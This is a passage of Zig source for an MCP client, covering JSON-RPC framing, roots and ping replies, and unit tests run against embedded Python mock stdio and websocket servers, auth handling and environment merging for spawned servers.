            .payload = try allocator.dupe(u8, std.mem.trimEnd(u8, buf.items(), "\r\n")),
            .mode = .jsonl,
        };
    }

    while (true) {
        if (buf.items().len >= 4 and std.mem.eql(u8, buf.items()[buf.items().len - 4 ..], "\r\n\r\n")) break;
        if (buf.items().len > 64 * 1024) return error.HeaderTooLarge;
        try waitReadableWithDeadline(file, deadline_ns);
        const n = file.readStreaming(rt.io, &.{&one}) catch |err| switch (err) {
            error.WouldBlock => continue,
            else => return err,
        };
        if (n == 0) return error.EndOfStream;
        try buf.append(one[0]);
    }

    var content_length: ?usize = null;
    var lines = std.mem.splitSequence(u8, buf.items(), "\r\n");
    while (lines.next()) |line| {
        if (line.len == 0) continue;
        const header_name = "Content-Length:";
        if (line.len >= header_name.len and std.ascii.eqlIgnoreCase(line[0..header_name.len], header_name)) {
            const v = std.mem.trim(u8, line[header_name.len..], " \t");
            content_length = try std.fmt.parseInt(usize, v, 10);
        }
    }

    const len = content_length orelse return error.MissingContentLength;
    if (len > max_bytes) return error.BodyTooLarge;

    const body = try allocator.alloc(u8, len);
    errdefer allocator.free(body);
    var read_total: usize = 0;
    while (read_total < len) {
        try waitReadableWithDeadline(file, deadline_ns);
        const n = file.readStreaming(rt.io, &.{body[read_total..]}) catch |err| switch (err) {
            error.WouldBlock => continue,
            else => return err,
        };
        if (n == 0) return error.EndOfStream;
        read_total += n;
    }
    return .{
        .payload = body,
        .mode = .content_length,
    };
}

fn waitReadableWithDeadline(file: std.Io.File, deadline_ns: i128) !void {
    // Poll in short slices so ESC during an MCP tool call becomes responsive
    // rather than blocking for up to 30 seconds on a single long poll.
    const slice_ms: i32 = 200;
    while (true) {
        try http_common.checkCancelled();
        const remaining = remainingTimeoutMs(deadline_ns) orelse return error.McpResponseTimeout;
        const wait_ms: i32 = if (remaining < slice_ms) remaining else slice_ms;
        var poll_fds = [_]std.posix.pollfd{.{
            .fd = file.handle,
            .events = std.posix.POLL.IN,
            .revents = 0,
        }};
        const n = std.posix.poll(&poll_fds, wait_ms) catch return error.McpResponseTimeout;
        if (n > 0) return;
    }
}

fn remainingTimeoutMs(deadline_ns: i128) ?i32 {
    const now_ns = clock.nowNanos();
    if (now_ns >= deadline_ns) return null;

    const rem_ns = deadline_ns - now_ns;
    const rem_ms_rounded = @divTrunc(rem_ns + std.time.ns_per_ms - 1, std.time.ns_per_ms);
    if (rem_ms_rounded <= 0) return 1;
    return std.math.cast(i32, rem_ms_rounded) orelse std.math.maxInt(i32);
}

pub const extractToolCallResultText = parsers.extractToolCallResultText;

pub const parseToolsResponse = parsers.parseToolsResponse;

pub const parseResourcesResponse = parsers.parseResourcesResponse;

pub const parseResourceTemplatesResponse = parsers.parseResourceTemplatesResponse;

pub const parseResourceReadResponse = parsers.parseResourceReadResponse;

pub const parsePromptsResponse = parsers.parsePromptsResponse;

pub const parsePromptResponse = parsers.parsePromptResponse;

pub const parseCompletionResponse = parsers.parseCompletionResponse;

const parseNextCursorAlloc = parsers.parseNextCursorAlloc;
const jsonValueAlloc = parsers.jsonValueAlloc;

pub fn encodeJsonAlloc(allocator: std.mem.Allocator, value: anytype) ![]u8 {
    var buf = std_io.StringBuilder.init(allocator);
    defer buf.deinit();
    try buf.writer().print("{f}", .{std.json.fmt(value, .{})});
    return buf.toOwnedSlice();
}

fn buildClientRequestResponseAlloc(self: *Client, server_name: []const u8, obj: std.json.ObjectMap, method: []const u8) !?[]u8 {
    const id_value = obj.get("id") orelse return null;
    const id_json = try jsonValueAlloc(self.allocator, id_value);
    defer self.allocator.free(id_json);

    const params_json = if (obj.get("params")) |params|
        try jsonValueAlloc(self.allocator, params)
    else
        try self.allocator.dupe(u8, "{}");
    defer self.allocator.free(params_json);

    if (std.mem.eql(u8, method, "roots/list")) {
        const result_json = if (self.activeBridge()) |bridge| blk: {
            if (bridge.list_roots) |roots_fn| {
                const roots = try roots_fn(bridge.ctx, self.allocator);
                defer freeRootInfos(self.allocator, roots);
                break :blk try buildRootsResultJson(self.allocator, roots);
            }
            break :blk try buildRootsListResultJson(self.allocator);
        } else try buildRootsListResultJson(self.allocator);
        defer self.allocator.free(result_json);
        return try buildRpcResultEnvelopeAlloc(self.allocator, id_json, result_json);
    }

    if (std.mem.eql(u8, method, "ping")) {
        return try buildRpcResultEnvelopeAlloc(self.allocator, id_json, "{}");
    }

    if (self.activeBridge()) |bridge| {
        if (bridge.handle_request) |handler| {
            if (try handler(bridge.ctx, self.allocator, method, params_json)) |result_json| {
                defer self.allocator.free(result_json);
                return try buildRpcResultEnvelopeAlloc(self.allocator, id_json, result_json);
            }
        }
    }

    _ = server_name;
    return try buildRpcErrorEnvelopeAlloc(self.allocator, id_json, -32601, method);
}

fn buildRootsListResultJson(allocator: std.mem.Allocator) ![]u8 {
    const cwd = allocator.dupe(u8, ".") catch try allocator.dupe(u8, "/");
    defer allocator.free(cwd);

    const uri = try pathToFileUriAlloc(allocator, cwd);
    defer allocator.free(uri);

    var buf = std_io.StringBuilder.init(allocator);
    defer buf.deinit();
    try buf.writer().writeAll("{\"roots\":[{\"uri\":");
    try appendJsonString(buf.writer(), uri);
    try buf.writer().writeAll(",\"name\":\"workspace\"}]}");
    return buf.toOwnedSlice();
}

fn buildRootsResultJson(allocator: std.mem.Allocator, roots: []const RootInfo) ![]u8 {
    var buf = std_io.StringBuilder.init(allocator);
    defer buf.deinit();
    try buf.writer().writeAll("{\"roots\":[");
    for (roots, 0..) |root, idx| {
        if (idx > 0) try buf.writer().writeByte(',');
        try buf.writer().writeAll("{\"uri\":");
        try appendJsonString(buf.writer(), root.uri);
        try buf.writer().writeAll(",\"name\":");
        try appendJsonString(buf.writer(), root.name);
        try buf.writer().writeByte('}');
    }
    try buf.writer().writeAll("]}");
    return buf.toOwnedSlice();
}

fn pathToFileUriAlloc(allocator: std.mem.Allocator, path: []const u8) ![]u8 {
    const component: std.Uri.Component = .{ .raw = path };
    const encoded_path = try std.fmt.allocPrint(allocator, "{f}", .{std.fmt.alt(component, .formatPath)});
    defer allocator.free(encoded_path);
    return std.fmt.allocPrint(allocator, "file://{s}", .{encoded_path});
}

fn buildRpcResultEnvelopeAlloc(allocator: std.mem.Allocator, id_json: []const u8, result_json: []const u8) ![]u8 {
    var buf = std_io.StringBuilder.init(allocator);
    defer buf.deinit();
    try buf.writer().writeAll("{\"jsonrpc\":\"2.0\",\"id\":");
    try buf.writer().writeAll(id_json);
    try buf.writer().writeAll(",\"result\":");
    try buf.writer().writeAll(result_json);
    try buf.writer().writeByte('}');
    return buf.toOwnedSlice();
}

fn buildRpcErrorEnvelopeAlloc(allocator: std.mem.Allocator, id_json: []const u8, code: i32, method: []const u8) ![]u8 {
    var buf = std_io.StringBuilder.init(allocator);
    defer buf.deinit();
    const message = try std.fmt.allocPrint(allocator, "Unsupported MCP client method: {s}", .{method});
    defer allocator.free(message);
    try buf.writer().writeAll("{\"jsonrpc\":\"2.0\",\"id\":");
    try buf.writer().writeAll(id_json);
    try buf.writer().writeAll(",\"error\":{\"code\":");
    try buf.writer().print("{d}", .{code});
    try buf.writer().writeAll(",\"message\":");
    try appendJsonString(buf.writer(), message);
    try buf.writer().writeAll("}}");
    return buf.toOwnedSlice();
}

const testing = std.testing;

test "free empty servers" {
    const allocator = testing.allocator;
    const empty = try allocator.alloc(Server, 0);
    defer freeServers(allocator, empty);
    try testing.expectEqual(@as(usize, 0), empty.len);
}

test "defaultHeaderName matches the hardcoded HTTP defaults case-insensitively" {
    try testing.expect(defaultHeaderName("content-type"));
    try testing.expect(defaultHeaderName("Authorization"));
    try testing.expect(defaultHeaderName("mcp-protocol-version"));
    try testing.expect(!defaultHeaderName("X-Custom"));
    try testing.expect(!defaultHeaderName("Mcp-Session-Id"));
}

test "appendOrOverrideHeader: a same-named extra header overrides the default" {
    const allocator = testing.allocator;
    var out = std.array_list.Managed([]u8).init(allocator);
    defer {
        for (out.items) |h| allocator.free(h);
        out.deinit();
    }
    const extra = [_]mcp_config.HeaderEntry{
        .{ .key = @constCast("authorization"), .value = @constCast("Bearer override") },
    };
    try appendOrOverrideHeader(allocator, &out, &extra, "Authorization", "Bearer default");
    try appendOrOverrideHeader(allocator, &out, &extra, "Accept", "application/json");

    try testing.expectEqual(@as(usize, 2), out.items.len);
    // The dynamic Authorization wins; Accept keeps its default.
    try testing.expectEqualStrings("Authorization: Bearer override", out.items[0]);
    try testing.expectEqualStrings("Accept: application/json", out.items[1]);
}

test "cacheServerInstructions stores and retrieves a single entry" {
    const allocator = testing.allocator;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();

    const registry_path = try @import("../core/test_helpers.zig").tmpDirCwd(testing.allocator, &tmp);
    defer allocator.free(registry_path);
    const full_path = try std.fs.path.join(allocator, &.{ registry_path, "registry.json" });
    defer allocator.free(full_path);

    var client = try Client.init(allocator, full_path);
    defer client.deinit();

    try testing.expectEqual(@as(?[]const u8, null), client.getServerInstructions("kali"));
    try client.cacheServerInstructions("kali", "Always pass a target to nmap_scan.");
    const cached = client.getServerInstructions("kali").?;
    try testing.expectEqualStrings("Always pass a target to nmap_scan.", cached);
}

test "cacheServerInstructions overwrites existing entry" {
    const allocator = testing.allocator;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();

    const registry_path = try @import("../core/test_helpers.zig").tmpDirCwd(testing.allocator, &tmp);
    defer allocator.free(registry_path);
    const full_path = try std.fs.path.join(allocator, &.{ registry_path, "registry.json" });
    defer allocator.free(full_path);

    var client = try Client.init(allocator, full_path);
    defer client.deinit();

    try client.cacheServerInstructions("kali", "first version");
    try client.cacheServerInstructions("kali", "second version");
    try testing.expectEqualStrings("second version", client.getServerInstructions("kali").?);
}

test "cacheServerInstructions with null or empty clears the entry" {
    const allocator = testing.allocator;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();

    const registry_path = try @import("../core/test_helpers.zig").tmpDirCwd(testing.allocator, &tmp);
    defer allocator.free(registry_path);
    const full_path = try std.fs.path.join(allocator, &.{ registry_path, "registry.json" });
    defer allocator.free(full_path);

    var client = try Client.init(allocator, full_path);
    defer client.deinit();

    try client.cacheServerInstructions("kali", "something");
    try testing.expect(client.getServerInstructions("kali") != null);
    try client.cacheServerInstructions("kali", null);
    try testing.expectEqual(@as(?[]const u8, null), client.getServerInstructions("kali"));

    try client.cacheServerInstructions("kali", "back again");
    try client.cacheServerInstructions("kali", "");
    try testing.expectEqual(@as(?[]const u8, null), client.getServerInstructions("kali"));
}

test "stdio MCP fixture covers tools resources prompts" {
    if (@import("../core/env.zig").getenv("CI") != null) return error.SkipZigTest;

    const allocator = testing.allocator;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();

    try tmp.dir.createDirPath(rt.io, "mcp");
    try tmp.dir.writeFile(rt.io, .{ .sub_path = "mcp/servers.json", .data = "[]" });
    try tmp.dir.writeFile(rt.io, .{ .sub_path = "mcp/mock_server.py", .data =
        \\import json, sys
        \\def read_frame():
        \\    header = b""
        \\    while b"\r\n\r\n" not in header:
        \\        c = sys.stdin.buffer.read(1)
        \\        if not c:
        \\            return None
        \\        header += c
        \\    length = 0
        \\    for line in header.decode("utf-8", errors="replace").split("\r\n"):
        \\        if line.lower().startswith("content-length:"):
        \\            length = int(line.split(":",1)[1].strip())
        \\            break
        \\    body = sys.stdin.buffer.read(length)
        \\    return json.loads(body.decode("utf-8"))
        \\def write_frame(obj):
        \\    body = json.dumps(obj).encode("utf-8")
        \\    sys.stdout.buffer.write(f"Content-Length: {len(body)}\r\n\r\n".encode("utf-8"))
        \\    sys.stdout.buffer.write(body)
        \\    sys.stdout.buffer.flush()
        \\while True:
        \\    msg = read_frame()
        \\    if msg is None:
        \\        break
        \\    method = msg.get("method")
        \\    if method == "initialize":
        \\        write_frame({"jsonrpc":"2.0","id":msg.get("id"),"result":{"protocolVersion":"2024-11-05","capabilities":{"tools":{},"resources":{},"prompts":{}},"serverInfo":{"name":"mock","version":"0.1"}}})
        \\    elif method == "notifications/initialized":
        \\        pass
        \\    elif method == "tools/list":
        \\        write_frame({"jsonrpc":"2.0","id":msg.get("id"),"result":{"tools":[{"name":"echo","description":"echo tool","inputSchema":{"type":"object","properties":{"payload":{"type":"string"}}}}]}})
        \\    elif method == "resources/list":
        \\        write_frame({"jsonrpc":"2.0","id":msg.get("id"),"result":{"resources":[{"uri":"figma://node/123","name":"Main Frame","description":"UI frame","mimeType":"application/json"}]}})
        \\    elif method == "resources/read":
        \\        write_frame({"jsonrpc":"2.0","id":msg.get("id"),"result":{"contents":[{"uri":"figma://node/123","mimeType":"text/plain","text":"frame data"}]}})
        \\    elif method == "prompts/list":
        \\        write_frame({"jsonrpc":"2.0","id":msg.get("id"),"result":{"prompts":[{"name":"get_design_context","description":"Fetch design context","arguments":[{"name":"nodeId","description":"Node ID","required":True}]}]}})
        \\    elif method == "prompts/get":
        \\        write_frame({"jsonrpc":"2.0","id":msg.get("id"),"result":{"description":"Use this context","messages":[{"role":"user","content":{"type":"text","text":"Inspect node 123"}}]}})
        \\    elif method == "tools/call":
        \\        name = msg.get("params", {}).get("name", "")
        \\        args = msg.get("params", {}).get("arguments", {})
        \\        write_frame({"jsonrpc":"2.0","id":msg.get("id"),"result":{"content":[{"type":"text","text":f"{name}:{json.dumps(args, sort_keys=True)}"}]}})
    });

    const script = try @import("../core/test_helpers.zig").tmpDirPath(testing.allocator, &tmp, "mcp/mock_server.py");
    defer allocator.free(script);
    const registry = try @import("../core/test_helpers.zig").tmpDirPath(testing.allocator, &tmp, "mcp/servers.json");
    defer allocator.free(registry);

    var client = try Client.init(allocator, registry);
    defer client.deinit();

    const transport = try std.fmt.allocPrint(allocator, "python3 '{s}'", .{script});
    defer allocator.free(transport);
    try client.add("demo", transport);

    {
        const tools = try client.listTools("demo");
        defer freeToolInfos(allocator, tools);
        try testing.expectEqual(@as(usize, 1), tools.len);
        try testing.expectEqualStrings("echo", tools[0].name);
    }
    {
        const resources = try client.listResources("demo");
        defer freeResourceInfos(allocator, resources);
        try testing.expectEqual(@as(usize, 1), resources.len);
        try testing.expectEqualStrings("figma://node/123", resources[0].uri);
    }
    {
        const contents = try client.readResource("demo", "figma://node/123");
        defer freeResourceContents(allocator, contents);
        try testing.expectEqual(@as(usize, 1), contents.len);
        try testing.expectEqualStrings("frame data", contents[0].text.?);
    }
    {
        const prompts = try client.listPrompts("demo");
        defer freePromptInfos(allocator, prompts);
        try testing.expectEqual(@as(usize, 1), prompts.len);
        try testing.expectEqualStrings("get_design_context", prompts[0].name);
        try testing.expectEqual(@as(usize, 1), prompts[0].arguments.len);
    }
    {
        var prompt = try client.getPrompt("demo", "get_design_context", "{\"nodeId\":\"123\"}");
        defer prompt.deinit(allocator);
        try testing.expectEqual(@as(usize, 1), prompt.messages.len);
        try testing.expectEqualStrings("Inspect node 123", prompt.messages[0].content);
    }
    {
        const invoked = try client.invoke("demo", "echo", "{\"payload\":\"hi\"}");
        defer allocator.free(invoked);
        try testing.expect(std.mem.indexOf(u8, invoked, "\"payload\": \"hi\"") != null);
    }
}

test "websocket MCP transport handles roots requests and ping" {
    const allocator = testing.allocator;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();

    try tmp.dir.createDirPath(rt.io, "mcp");
    try tmp.dir.writeFile(rt.io, .{ .sub_path = "mcp/servers.json", .data = "[]" });
    try tmp.dir.writeFile(rt.io, .{ .sub_path = "mcp/ws_server.py", .data =
        \\import base64, hashlib, json, socket, struct, sys
        \\GUID = "258EAFA5-E914-47DA-95CA-5AB5DC525C76"
        \\def recv_exact(conn, n):
        \\    data = b""
        \\    while len(data) < n:
        \\        chunk = conn.recv(n - len(data))
        \\        if not chunk:
        \\            raise EOFError()
        \\        data += chunk
        \\    return data
        \\def read_http_request(conn):
        \\    data = b""
        \\    while b"\r\n\r\n" not in data:
        \\        chunk = conn.recv(4096)
        \\        if not chunk:
        \\            raise EOFError()
        \\        data += chunk
        \\    return data
        \\def write_frame(conn, opcode, payload=b"", fin=True):
        \\    if isinstance(payload, str):
        \\        payload = payload.encode("utf-8")
        \\    first = (0x80 if fin else 0) | opcode
        \\    header = bytes([first])
        \\    size = len(payload)
        \\    if size < 126:
        \\        header += bytes([size])
        \\    elif size < 65536:
        \\        header += bytes([126]) + struct.pack(">H", size)
        \\    else:
        \\        header += bytes([127]) + struct.pack(">Q", size)
        \\    conn.sendall(header + payload)
        \\def read_frame(conn):
        \\    head = recv_exact(conn, 2)
        \\    b1, b2 = head[0], head[1]
        \\    fin = bool(b1 & 0x80)
        \\    opcode = b1 & 0x0F
        \\    masked = bool(b2 & 0x80)
        \\    size = b2 & 0x7F
        \\    if size == 126:
        \\        size = struct.unpack(">H", recv_exact(conn, 2))[0]
        \\    elif size == 127:
        \\        size = struct.unpack(">Q", recv_exact(conn, 8))[0]
        \\    mask = recv_exact(conn, 4) if masked else b""
        \\    payload = bytearray(recv_exact(conn, size))
        \\    if masked:
        \\        for i in range(size):
        \\            payload[i] ^= mask[i % 4]
        \\    return fin, opcode, bytes(payload)
        \\def read_text_message(conn):
        \\    out = bytearray()
        \\    started = False
        \\    while True:
        \\        fin, opcode, payload = read_frame(conn)
        \\        if opcode == 0x9:
        \\            write_frame(conn, 0xA, payload)
        \\            continue
        \\        if opcode == 0x8:
        \\            return None
        \\        if opcode == 0x1:
        \\            started = True
        \\            out.extend(payload)
        \\            if fin:
        \\                return out.decode("utf-8")
        \\        elif opcode == 0x0 and started:
        \\            out.extend(payload)
        \\            if fin:
        \\                return out.decode("utf-8")
        \\def serve_once(server):
        \\    conn, _ = server.accept()
        \\    with conn:
        \\        request = read_http_request(conn).decode("utf-8", "replace")
        \\        key = ""
        \\        for line in request.split("\r\n"):
        \\            if line.lower().startswith("sec-websocket-key:"):
        \\                key = line.split(":", 1)[1].strip()
        \\        accept = base64.b64encode(hashlib.sha1((key + GUID).encode("utf-8")).digest()).decode("utf-8")
        \\        conn.sendall((
        \\            "HTTP/1.1 101 Switching Protocols\r\n"
        \\            "Upgrade: websocket\r\n"
        \\            "Connection: Upgrade\r\n"
        \\            f"Sec-WebSocket-Accept: {accept}\r\n\r\n"
        \\        ).encode("utf-8"))
        \\        while True:
        \\            text = read_text_message(conn)
        \\            if text is None:
        \\                break
        \\            msg = json.loads(text)
        \\            method = msg.get("method")
        \\            if method == "initialize":
        \\                write_frame(conn, 0x1, json.dumps({"jsonrpc":"2.0","id":"roots-1","method":"roots/list","params":{}}))
        \\                roots_reply = json.loads(read_text_message(conn))
        \\                assert roots_reply["id"] == "roots-1"
        \\                assert roots_reply["result"]["roots"][0]["uri"].startswith("file://")
        \\                write_frame(conn, 0x1, json.dumps({"jsonrpc":"2.0","id":msg["id"],"result":{"protocolVersion":"2024-11-05","capabilities":{"tools":{},"roots":{}},"serverInfo":{"name":"ws-mock","version":"0.1"}}}))
        \\            elif method == "notifications/initialized":
        \\                pass
        \\            elif method == "tools/list":
        \\                write_frame(conn, 0x1, json.dumps({"jsonrpc":"2.0","id":msg["id"],"result":{"tools":[{"name":"echo","description":"echo over ws","inputSchema":{"type":"object","properties":{"payload":{"type":"string"}}}}]}}))
        \\                break
        \\server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        \\server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        \\server.bind(("127.0.0.1", 0))
        \\server.listen(5)
        \\print(server.getsockname()[1], flush=True)
        \\serve_once(server)
    });

    const script = try @import("../core/test_helpers.zig").tmpDirPath(testing.allocator, &tmp, "mcp/ws_server.py");
    defer allocator.free(script);
    const registry = try @import("../core/test_helpers.zig").tmpDirPath(testing.allocator, &tmp, "mcp/servers.json");
    defer allocator.free(registry);

    var child = try std.process.spawn(rt.io, .{
        .argv = &[_][]const u8{ "python3", script },
        .stdin = .ignore,
        .stdout = .pipe,
        // Same deadlock hazard as spawnStdioSession above: if the Python
        // server writes more than a pipe buffer to stderr the test hangs.
        // Ignore stderr for safety.
        .stderr = .ignore,
    });
    defer {
        terminateChild(&child);
    }

    var stdout = child.stdout orelse return error.MissingStdOutPipe;
    var port_buf: [32]u8 = undefined;
    var port_len: usize = 0;
    while (port_len < port_buf.len) : (port_len += 1) {
        const n = try stdout.readStreaming(rt.io, &.{port_buf[port_len .. port_len + 1]});
        if (n == 0) return error.EndOfStream;
        if (port_buf[port_len] == '\n') break;
    }
    const port_text = std.mem.trim(u8, port_buf[0..port_len], " \t\r\n");
    const port = try std.fmt.parseInt(u16, port_text, 10);

    var client = try Client.init(allocator, registry);
    defer client.deinit();

    const transport = try std.fmt.allocPrint(allocator, "ws://127.0.0.1:{d}/mcp", .{port});
    defer allocator.free(transport);
    try client.add("wsdemo", transport);

    const tools = try client.listTools("wsdemo");
    defer freeToolInfos(allocator, tools);
    try testing.expectEqual(@as(usize, 1), tools.len);
    try testing.expectEqualStrings("echo", tools[0].name);
}

test "auth login and logout roundtrip" {
    const allocator = testing.allocator;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();

    try tmp.dir.createDirPath(rt.io, "mcp");
    try tmp.dir.writeFile(rt.io, .{ .sub_path = "mcp/servers.json", .data = "[]" });

    const registry = try @import("../core/test_helpers.zig").tmpDirPath(testing.allocator, &tmp, "mcp/servers.json");
    defer allocator.free(registry);

    var client = try Client.init(allocator, registry);
    defer client.deinit();

    try client.authLoginDetailed("demo", "secret-token", "bearer", "refresh-me", 12345, "browser-oauth");
    {
        const statuses = try client.authStatus(null);
        defer freeAuthStatuses(allocator, statuses);
        try testing.expectEqual(@as(usize, 1), statuses.len);
        try testing.expectEqualStrings("demo", statuses[0].server);
        try testing.expect(statuses[0].refreshable);
        try testing.expectEqual(@as(?i64, 12345), statuses[0].expires_ts);
        try testing.expectEqualStrings("browser-oauth", statuses[0].auth_mode);
    }

    const removed = try client.authLogout("demo");
    try testing.expect(removed);

    {
        const statuses = try client.authStatus(null);
        defer freeAuthStatuses(allocator, statuses);
        try testing.expectEqual(@as(usize, 0), statuses.len);
    }
}

test "parse streamable HTTP SSE envelope by request id" {
    const allocator = testing.allocator;
    const raw =
        "event: message\n" ++
        "data: {\"jsonrpc\":\"2.0\",\"id\":7,\"result\":{\"tools\":[{\"name\":\"echo\"}]}}\n\n" ++
        "data: [DONE]\n\n";

    var client = try Client.init(allocator, "/tmp/zcode-mcp-test-servers.json");
    defer client.deinit();
    const payload = (try extractRpcEnvelopeFromSse(&client, "demo", raw, 7, null)).?;
    defer client.allocator.free(payload);
    try testing.expect(std.mem.indexOf(u8, payload, "\"tools\"") != null);
}

test "parse resources response fixture" {
    const allocator = testing.allocator;
    const response =
        "{\"jsonrpc\":\"2.0\",\"id\":2,\"result\":{\"resources\":[{\"uri\":\"figma://node/1\",\"name\":\"Frame\",\"description\":\"Main\",\"mimeType\":\"application/json\"}]}}";

    const resources = try parseResourcesResponse(allocator, response);
    defer freeResourceInfos(allocator, resources);
    try testing.expectEqual(@as(usize, 1), resources.len);
    try testing.expectEqualStrings("Frame", resources[0].name);
}

test "parse resource templates response fixture" {
    const allocator = testing.allocator;
    const response =
        "{\"jsonrpc\":\"2.0\",\"id\":2,\"result\":{\"resourceTemplates\":[{\"uriTemplate\":\"figma://node/{id}\",\"name\":\"Node\",\"description\":\"Template\",\"mimeType\":\"application/json\"}]}}";

    const templates = try parseResourceTemplatesResponse(allocator, response);
    defer freeResourceTemplateInfos(allocator, templates);
    try testing.expectEqual(@as(usize, 1), templates.len);
    try testing.expectEqualStrings("figma://node/{id}", templates[0].uri_template);
}

test "parse completion response fixture" {
    const allocator = testing.allocator;
    const response =
        "{\"jsonrpc\":\"2.0\",\"id\":3,\"result\":{\"completion\":{\"values\":[\"python\",\"pyside\"],\"total\":2,\"hasMore\":false}}}";

    var completion = try parseCompletionResponse(allocator, response);
    defer completion.deinit(allocator);
    try testing.expectEqual(@as(usize, 2), completion.values.len);
    try testing.expectEqualStrings("python", completion.values[0]);
    try testing.expect(completion.total.? == 2);
    try testing.expect(!completion.has_more);
}

test "parse next cursor from paginated result fixture" {
    const allocator = testing.allocator;
    const response = "{\"jsonrpc\":\"2.0\",\"id\":4,\"result\":{\"tools\":[],\"nextCursor\":\"page-2\"}}";
    const next_cursor = (try parseNextCursorAlloc(allocator, response)).?;
    defer allocator.free(next_cursor);
    try testing.expectEqualStrings("page-2", next_cursor);
}

test "client bridge responds to sampling request and records notifications" {
    const allocator = testing.allocator;
    var client = try Client.init(allocator, "/tmp/zcode-mcp-bridge-test.json");
    defer client.deinit();

    const BridgeCtx = struct {
        saw_notification: bool = false,

        fn handleRequest(_: *anyopaque, alloc: std.mem.Allocator, method: []const u8, params_json: []const u8) anyerror!?[]u8 {
            if (!std.mem.eql(u8, method, "sampling/createMessage")) return null;
            if (std.mem.indexOf(u8, params_json, "messages") == null) return error.InvalidRequest;
            return try alloc.dupe(u8, "{\"model\":\"mock-model\",\"role\":\"assistant\",\"content\":{\"type\":\"text\",\"text\":\"ok\"}}");
        }

        fn handleNotification(ctx: *anyopaque, _: std.mem.Allocator, _: []const u8, method: []const u8, _: []const u8) anyerror!void {
            const self: *@This() = @ptrCast(@alignCast(ctx));
            if (std.mem.eql(u8, method, "notifications/message")) self.saw_notification = true;
        }
    };

    var bridge_ctx = BridgeCtx{};
    try client.pushBridge(.{
        .ctx = @ptrCast(&bridge_ctx),
        .handle_request = BridgeCtx.handleRequest,
        .handle_notification = BridgeCtx.handleNotification,
    });
    defer client.popBridge(@ptrCast(&bridge_ctx));

    var sampling_request = try std.json.parseFromSlice(
        std.json.Value,
        allocator,
        "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"sampling/createMessage\",\"params\":{\"messages\":[{\"role\":\"user\",\"content\":{\"type\":\"text\",\"text\":\"hello\"}}],\"maxTokens\":32}}",
        .{},
    );
    defer sampling_request.deinit();
    const response = (try buildClientRequestResponseAlloc(&client, "demo", sampling_request.value.object, "sampling/createMessage")).?;
    defer allocator.free(response);
    try testing.expect(std.mem.indexOf(u8, response, "\"mock-model\"") != null);

    try maybeRecordNotificationFromJson(&client, "demo", "{\"jsonrpc\":\"2.0\",\"method\":\"notifications/message\",\"params\":{\"level\":\"info\",\"data\":\"done\"}}");
    const notifications = try client.takeNotifications(null);
    defer freeNotificationEvents(allocator, notifications);
    try testing.expectEqual(@as(usize, 1), notifications.len);
    try testing.expect(bridge_ctx.saw_notification);
}

test "parse prompt response fixture" {
    const allocator = testing.allocator;
    const response =
        "{\"jsonrpc\":\"2.0\",\"id\":3,\"result\":{\"description\":\"Prompt\",\"messages\":[{\"role\":\"user\",\"content\":{\"type\":\"text\",\"text\":\"Inspect design\"}}]}}";

    var prompt = try parsePromptResponse(allocator, response);
    defer prompt.deinit(allocator);
    try testing.expectEqualStrings("Prompt", prompt.description);
    try testing.expectEqual(@as(usize, 1), prompt.messages.len);
    try testing.expectEqualStrings("Inspect design", prompt.messages[0].content);
}

extern "c" fn setenv(name: [*:0]const u8, value: [*:0]const u8, overwrite: c_int) c_int;
extern "c" fn unsetenv(name: [*:0]const u8) c_int;

/// Read the spawned child's stdout to EOF (the test child writes one line via
/// `echo` and exits, closing the pipe). Caller owns the returned slice.
fn readStdioSessionToEnd(allocator: std.mem.Allocator, session: *StdioSession) ![]u8 {
    var out = std.array_list.Managed(u8).init(allocator);
    errdefer out.deinit();
    var buf: [256]u8 = undefined;
    while (true) {
        const n = session.stdout.readStreaming(rt.io, &.{&buf}) catch |err| switch (err) {
            error.EndOfStream => break,
            else => return err,
        };
        if (n == 0) break;
        try out.appendSlice(buf[0..n]);
    }
    return out.toOwnedSlice();
}

test "spawnStdioSession inherits parent env and merges per-server env" {
    const allocator = testing.allocator;

    _ = setenv("FROM_PARENT", "p", 1);
    defer _ = unsetenv("FROM_PARENT");

    const server_env = [_]mcp_config.EnvEntry{
        .{ .key = @constCast("FROM_SERVER"), .value = @constCast("v") },
    };

    var session = try spawnStdioSession(
        allocator,
        "/bin/sh",
        &[_][]const u8{ "-c", "printf '%s:%s' \"$FROM_PARENT\" \"$FROM_SERVER\"" },
        &server_env,
        null,
    );
    const output = try readStdioSessionToEnd(allocator, &session);
    defer allocator.free(output);
    session.deinit();

    try testing.expectEqualStrings("p:v", output);
}

test "spawnStdioSession per-server env overrides a parent var of the same name" {
    const allocator = testing.allocator;

    _ = setenv("MCP_COLLIDE", "parent-value", 1);
    defer _ = unsetenv("MCP_COLLIDE");

    const server_env = [_]mcp_config.EnvEntry{
        .{ .key = @constCast("MCP_COLLIDE"), .value = @constCast("server-value") },
    };

    var session = try spawnStdioSession(
        allocator,
        "/bin/sh",
        &[_][]const u8{ "-c", "printf '%s' \"$MCP_COLLIDE\"" },
        &server_env,
        null,
    );
    const output = try readStdioSessionToEnd(allocator, &session);
    defer allocator.free(output);
    session.deinit();

    try testing.expectEqualStrings("server-value", output);
}

test "spawnStdioSession injects the MCP auth token vars" {
    const allocator = testing.allocator;

    var session = try spawnStdioSession(
        allocator,
        "/bin/sh",
        &[_][]const u8{ "-c", "printf '%s:%s' \"$MCP_AUTH_TOKEN\" \"$ZCODE_MCP_AUTH_TOKEN\"" },
        &.{},
        "tok123",
    );
    const output = try readStdioSessionToEnd(allocator, &session);
    defer allocator.free(output);
    session.deinit();

    try testing.expectEqualStrings("tok123:tok123", output);
}

test "transportLooksShellLike flags shell metachars and env prefixes" {
    // Plain command + args: tokenizable, not shell-like.
    try testing.expect(!transportLooksShellLike("npx -y some-server"));
    try testing.expect(!transportLooksShellLike("/usr/local/bin/my-mcp --flag value"));
    // Shell metacharacters require a real shell.
    try testing.expect(transportLooksShellLike("cmd | other"));
    try testing.expect(transportLooksShellLike("a && b"));
    try testing.expect(transportLooksShellLike("echo $HOME"));
    try testing.expect(transportLooksShellLike("server > out.log"));
